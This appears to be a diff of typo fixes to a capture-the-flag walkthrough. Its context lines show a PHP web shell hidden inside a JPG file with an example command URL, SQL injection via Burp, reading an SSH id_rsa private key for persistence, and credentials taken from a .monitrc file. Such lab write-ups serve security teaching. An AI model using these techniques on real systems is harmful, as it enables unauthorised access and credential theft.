@@ -49,7 +49,7 @@ This leads us to a different authentication panel. Since we lack credentials, we
 ####
 <div class="warning">
 
-> Without the `token` and `cookie`, SQLi is not possible. **Burpsuite** is necessary since **caido** cannot export requests in XML format.
+> Without the `token` and `cookie`, SQLi is not possible. **Burpsuite** is necessary since **Caido** cannot export requests in XML format.
 </div>
 
 ####
@@ -157,7 +157,7 @@ The dependency that comes closest to this is: [*Encode/larabel admin 1.8.18*]. H
 ####
 We generate an image with its corresponding headers and insert some PHP code to obtain a **cmd** into this file, so form that if we change the file extention to **php**, we will are able to execute commands in the target machine doing use the **cmd** parameter into the url. Something similar to this: http://127.0.0.1/images/malicius.jpg.php?cmd=whoami.
 ####
-The PHP code is this `<?php system($_REQUEST['cmd']); ?>`. We will use this code to execute commands in the target machine putting the PHP code into the image file. The *PocC* image file have a `.jpg` extention and have the next header:
+The PHP code is this `<?php system($_REQUEST['cmd']); ?>`. We will use this code to execute commands in the target machine putting the PHP code into the image file. The *PoC* image file have a `.jpg` extention and have the next header:
 ####
 ```rust
 Hexadecimal ->
@@ -217,7 +217,7 @@ elif response.status_code == 404:
 ####
 ## Lateral Movement
 ### SSH Service:
-Investigating within the machine, we can read the **id_rsa** file [*Ssh authentication via a file*], so the first thing is to ensure persistence as soon as possible. It's very tedious to go through the previous process with burpsuite. `cat ~/.ssh/id_rsa`. 
+Investigating within the machine, we can read the **id_rsa** file [*ssh authentication via a file*], so the first thing is to ensure persistence as soon as possible. It's very tedious to go through the previous process with burpsuite. `cat ~/.ssh/id_rsa`. 
 ####
 Searching for *SUID* permissions, we don't find anything, not even for **capabilities**, but there is an interesting file in the `/home` of the `dash` user, our current user. The **.monitrc** file is not common, which indicates a possible exploit vector. If we read the file, we see a username and password.
 ####
